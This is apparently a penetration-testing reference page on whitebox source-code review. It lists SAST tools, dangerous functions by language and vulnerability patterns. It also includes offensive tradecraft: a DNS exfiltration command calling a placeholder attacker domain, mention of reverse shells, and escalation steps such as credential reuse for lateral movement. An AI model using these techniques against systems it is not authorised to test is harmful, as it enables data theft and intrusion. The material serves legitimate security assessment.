# Whitebox Pentesting

> **Summary**: Whitebox (source code) penetration testing involves reviewing application source code to identify vulnerabilities, dangerous function usage, and insecure patterns before or alongside dynamic testing.
> **Impact**: Discovery of critical vulnerabilities (RCE, SQLi, XSS, deserialization, auth bypass) that may be difficult to find via blackbox testing alone.
> **Typical Severity**: Varies (findings range from Low to Critical)

## Detection

### Indicators
- Access to source code repository, deployment packages, or decompiled binaries
- Configuration files, environment variables, and infrastructure-as-code templates available
- Dependency manifests (package.json, requirements.txt, pom.xml, Gemfile) accessible

### Automated Detection (SAST Tools)

| Tool | Language Support | Usage |
|------|-----------------|-------|
| Semgrep | Python, JS/TS, Java, Go, Ruby, PHP, C# | `semgrep scan --config auto <DIRECTORY>` |
| CodeQL | JS, Python, Java, C/C++, C#, Go, Ruby | Create database + run queries via GitHub Actions or CLI |
| SonarQube | 30+ languages | Self-hosted or cloud; integrates with CI/CD |
| Bandit | Python | `bandit -r <DIRECTORY>` |
| Brakeman | Ruby on Rails | `brakeman -A -q <RAILS_ROOT>` |
| phpstan / psalm | PHP | Static analysis for type safety and security |
| gosec | Go | `gosec ./...` |
| eslint-plugin-security | JavaScript/Node.js | Add to ESLint config |

### Dependency Analysis

| Tool | Ecosystem | Usage |
|------|-----------|-------|
| npm audit | Node.js | `npm audit` / `npm audit fix` |
| Snyk | Multi-language | `snyk test` / `snyk monitor` |
| retire.js | JavaScript | `retire --path <DIRECTORY>` |
| pip-audit | Python | `pip-audit` |
| OWASP Dependency-Check | Java/.NET | `dependency-check --project <NAME> --scan <DIR>` |
| trivy | Container/Filesystem | `trivy fs <DIRECTORY>` |
| bundler-audit | Ruby | `bundler-audit check` |

### Manual Detection
- Grep for dangerous functions (see tables below)
- Trace user input from entry points (parameters, headers, cookies) through to sinks
- Review authentication/authorization logic, session management, and cryptographic implementations

## Exploitation

### Prerequisites
- Access to source code (full or partial)
- Understanding of the application's language, framework, and architecture
- Ability to set up a local testing environment for validation

### Step-by-Step (Code Review Methodology)

1. **Understand the application architecture**: Review directory structure, routing, middleware, and configuration.
   **Success**: You have a mental model of data flow from HTTP request to response.

2. **Identify entry points**: Find all user-controlled input sources:
   - HTTP parameters (GET/POST), headers, cookies
   - File uploads, WebSocket messages, API inputs
   - Database-driven content rendered without escaping

3. **Search for dangerous sinks**: Grep for language-specific dangerous functions (see tables below).
   **Success**: List of potentially vulnerable code paths.

4. **Trace data flow**: Follow user input from entry point to sink. Check for:
   - Missing or inadequate input validation
   - Missing output encoding/escaping
   - Improper use of parameterized queries
   - Unsafe deserialization

5. **Validate findings locally**: Set up a local instance and confirm exploitability with crafted input.
   **Success**: Working proof of concept that demonstrates the vulnerability.

6. **Check configuration and secrets**: Review for hardcoded credentials, debug modes, and insecure defaults.

### Dangerous Functions by Language

#### PHP
| Category | Functions |
|----------|-----------|
| Command Injection | `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`, `pcntl_exec`, `backtick operator` |
| Code Execution | `eval`, `assert`, `preg_replace` (with /e), `create_function`, `call_user_func`, `include`, `require` |
| File Operations | `file_get_contents`, `file_put_contents`, `fopen`, `readfile`, `unlink`, `move_uploaded_file` |
| SQL Injection | Direct string concatenation in `mysql_query`, `mysqli_query`, `PDO::query` |
| Deserialization | `unserialize`, `yaml_parse` |
| SSRF | `file_get_contents`, `curl_exec`, `fopen` with URLs |
| Type Juggling | `==` (loose comparison), `!=`, `switch` without strict typing |

#### JavaScript / Node.js
| Category | Functions |
|----------|-----------|
| Command Injection | `child_process.exec`, `child_process.spawn`, `child_process.execSync`, `child_process.execFile` |
| Code Execution | `eval`, `Function`, `setTimeout(string)`, `setInterval(string)`, `vm.runInNewContext` |
| Prototype Pollution | `Object.assign`, `_.merge`, `_.extend`, `_.defaultsDeep`, spread with user input |
| SQL Injection | String concatenation in query builders |
| Path Traversal | `path.join` with unsanitized input, `fs.readFile`, `fs.readFileSync` |
| Deserialization | `node-serialize`, `funcster`, `cryo` |
| XSS | `innerHTML`, `outerHTML`, `document.write`, `v-html`, `dangerouslySetInnerHTML` |

#### Python
| Category | Functions |
|----------|-----------|
| Command Injection | `os.system`, `os.popen`, `subprocess.call`, `subprocess.run`, `subprocess.Popen` |
| Code Execution | `eval`, `exec`, `compile`, `__import__` |
| Deserialization | `pickle.loads`, `yaml.load` (without SafeLoader), `jsonpickle.decode` |
| SQL Injection | String formatting in `cursor.execute`, `sqlalchemy.text` with f-strings |
| SSTI | `render_template_string`, `jinja2.Template` with user input |
| Path Traversal | `open()`, `os.path.join` with unsanitized input |

#### Java
| Category | Functions / Patterns |
|----------|-----------|
| Command Injection | `Runtime.getRuntime().exec`, `ProcessBuilder` |
| Deserialization | `ObjectInputStream.readObject`, `XMLDecoder`, `XStream`, `SnakeYAML` |
| SQL Injection | String concatenation in `Statement.execute`, `PreparedStatement` misuse |
| SSRF | `URL.openConnection`, `HttpURLConnection`, `RestTemplate`, `OkHttp` |
| Expression Language | `SpEL`, `OGNL`, `MVEL`, `JEXL` injection |
| XXE | `DocumentBuilderFactory`, `SAXParser`, `XMLReader` without secure configuration |

#### Ruby
| Category | Functions |
|----------|-----------|
| Command Injection | `system`, `exec`, `` `backticks` ``, `%x{}`, `IO.popen`, `Open3.capture3` |
| Code Execution | `eval`, `instance_eval`, `class_eval`, `send`, `public_send` |
| Deserialization | `Marshal.load`, `YAML.load` (use `YAML.safe_load`), `Oj.load` |
| SQL Injection | String interpolation in `where`, `find_by_sql`, `ActiveRecord` raw SQL |
| SSTI | `ERB.new` with user input |

#### C# / .NET
| Category | Functions |
|----------|-----------|
| Command Injection | `System.Diagnostics.Process.Start` |
| Deserialization | `BinaryFormatter.Deserialize`, `JavaScriptSerializer`, `Json.NET` with TypeNameHandling |
| SQL Injection | String concatenation in `SqlCommand`, `ExecuteReader` |
| XXE | `XmlDocument.Load`, `XmlReader` without `DtdProcessing.Prohibit` |

### Common Vulnerability Patterns in Code

| Pattern | What to Look For |
|---------|-----------------|
| Missing auth checks | Routes without `@login_required`, `[Authorize]`, or middleware |
| IDOR | Database lookups using user-supplied ID without ownership check |
| Mass assignment | `request.body` passed directly to ORM create/update |
| Hardcoded secrets | API keys, passwords, tokens in source code or config files |
| Debug mode in production | `DEBUG=True`, `app.debug`, verbose error pages |
| Insecure randomness | `Math.random()`, `rand()` for security-sensitive values |
| Missing CSRF tokens | State-changing POST endpoints without CSRF validation |
| Open redirect | `redirect(request.params['url'])` without allowlist |

### Proof of Concept

```bash
# Quick Semgrep scan for security issues
semgrep scan --config "p/owasp-top-ten" --config "p/security-audit" <TARGET_DIR>

# Python-specific scan
bandit -r <TARGET_DIR> -f json -o bandit_results.json

# Dependency vulnerability check
snyk test --all-projects

# Grep for dangerous patterns (PHP example)
grep -rn "eval\|system\|exec\|shell_exec\|passthru\|unserialize" --include="*.php" <TARGET_DIR>
```

## Bypasses

- If SAST tools miss a vulnerability, trace the data flow manually from input to sink
- Look for custom wrapper functions that internally call dangerous functions
- Check for indirect calls via reflection, dynamic dispatch, or callback patterns
- Review third-party libraries and middleware for known vulnerabilities

## Escalation

- **Code execution to full compromise**: Validate RCE findings and pivot to infrastructure
- **SQL injection to data exfiltration**: Confirm database access and extract sensitive data
- **Hardcoded credentials to lateral movement**: Use discovered credentials across services
- **Insecure deserialization to RCE**: Build gadget chains for the target framework

## Payload Development Rules

1. Comment out the rest of the code if injecting inline
2. Ensure quotes, parentheses, and curly braces are balanced
3. Maintain working syntax without errors
4. Test payloads locally before targeting production

## Methods for Obtaining Command Output

1. Log output to console (local testing)
2. Use a reverse shell
3. Use DNS exfiltration (`ping $(whoami).<ATTACKER_DOMAIN>`)
4. Store the output in the database
5. Write the output to a file, then access that file
6. Inject the output into the HTTP response
7. Use sleep timers or boolean output for blind extraction

## Type Juggling (PHP)

- Identify loose comparisons using `==` or `!=`
- Check the PHP version and consult the [Type Comparison Table](https://www.php.net/manual/en/types.comparisons.php)
- Exploit with inputs like `0`, `""`, `null`, `[]`, `"0e1234"` (magic hashes)
- **Prevention**: Use strict comparison operators `===` and `!==`

## Exploit Scripting Language Guide

| Use Case | Recommended Language | Reason |
|----------|---------------------|--------|
| Network/web application attack | Python | Cross-platform, rich HTTP libraries |
| Client-side attack (CSRF, XSS) | JavaScript | Only language executed by browsers |
| Web chain with client-side component | Python + JavaScript | JS payload for client-side, Python for automation |
| Binary exploitation | Python (pwntools) | Good debugging and exploitation libraries |
| OS-level targeting | Bash / PowerShell | Pre-installed scripting on target OS |
| Thick client / app-specific | Application's language | Reuse code/functions for payload generation |

## Tools

| Tool | Usage |
|------|-------|
| Semgrep | `semgrep scan --config auto <DIR>` -- fast, customizable SAST |
| CodeQL | Advanced semantic code analysis via GitHub |
| SonarQube | Comprehensive multi-language SAST platform |
| Snyk | `snyk test` -- dependency and code vulnerability scanning |
| Bandit | `bandit -r <DIR>` -- Python security linter |
| Brakeman | `brakeman <RAILS_ROOT>` -- Ruby on Rails scanner |
| retire.js | `retire --path <DIR>` -- JavaScript library vulnerability detection |
| npm audit | `npm audit` -- Node.js dependency vulnerabilities |
| trivy | `trivy fs <DIR>` -- filesystem vulnerability scanning |

## References

- [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Semgrep Rules Registry](https://semgrep.dev/explore)
- [PHP Type Comparison Table](https://www.php.net/manual/en/types.comparisons.php)

## Cross-References

- [Command Injection](command-injection.md) -- Dangerous function exploitation
- [SQL Injection](sqli.md) -- Code patterns leading to SQLi
- [XSS](xss.md) -- Unsafe output rendering in source code
- [Deserialization](deserialization.md) -- Insecure deserialization patterns
- [SSTI](ssti.md) -- Template injection via code review
